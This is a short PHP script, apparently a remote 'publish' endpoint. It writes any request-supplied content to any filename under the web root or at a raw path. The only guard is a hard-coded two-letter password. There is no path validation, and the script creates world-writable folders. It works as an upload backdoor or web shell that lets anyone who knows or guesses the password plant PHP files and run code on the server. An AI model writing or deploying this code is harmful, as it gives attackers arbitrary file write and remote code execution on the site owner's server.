<?php
//header("Content-Type: text/html; charset=utf-8");
$config_password="yt";
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];
$folderpath=$_REQUEST['folderpath'];
$filename=$_REQUEST['filename'];
$body=stripslashes($_REQUEST['body']);

if($password==""||$filename==""||$body=="")
{
    echo 'parameters error!';
    return;
}

if($password!=$config_password)
{
    echo 'password error!';
    return;
}

$rootPath=$_SERVER['DOCUMENT_ROOT'];
$newPath=$rootPath;

if($folderpath!="")
{
  if($folderpath=="root")
  {
    $newPath=$rootPath.'/'.$filename;
  }
  else
  {
    createFolder($rootPath.'/'.$folderpath);
    $newPath=$rootPath.'/'.$folderpath.'/'.$filename;
  }
}
else
{
  $newPath=$filename;
}


$fp=fopen($newPath,"w");
//fwrite($fp,"\xEF\xBB\xBF".iconv('gbk','utf-8//IGNORE',$body));
fwrite($fp,$body);
fclose($fp);

if(file_exists($newPath))
{
    echo "publish success & uploaded";
}

function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777);
    }
}
?>